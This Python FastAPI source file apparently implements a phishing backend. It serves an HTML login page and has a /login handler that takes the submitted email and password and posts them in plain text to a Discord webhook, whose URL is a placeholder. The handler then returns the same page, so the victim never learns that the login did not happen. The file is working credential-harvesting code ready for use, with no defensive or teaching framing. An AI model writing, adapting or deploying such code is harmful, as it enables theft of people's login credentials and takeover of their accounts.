from fastapi import FastAPI, Request, Form
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates
from fastapi.staticfiles import StaticFiles
import requests

app = FastAPI()

# Set up Jinja2 templates
templates = Jinja2Templates(directory="templates")

app.mount("/static", StaticFiles(directory="static"), name="static")

@app.get("/", response_class=HTMLResponse)
async def read_root(request: Request):
    return templates.TemplateResponse("Component.html", {"request": request})

@app.post("/login", response_class=HTMLResponse)
async def login(request: Request, email: str = Form(...), password: str = Form(...)):
    # Discord webhook URL (replace with your actual webhook URL)
    discord_webhook_url = "YOUR_DISCORD_WEBHOOK"

    # Prepare the data to send to Discord
    data = {
        "content": f"Login Attempt:\nUsername: {email}\nPassword: {password}"
    }

    # Send the data to the Discord webhook
    response = requests.post(discord_webhook_url, json=data)

    # Check if the request was successful
    if response.status_code == 204:
        print("Successfully sent message to Discord")
    else:
        print(f"Failed to send message to Discord: {response.status_code}")

    # Return the same template
    return templates.TemplateResponse("Component.html", {"request": request})

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="127.0.0.1", port=8000)
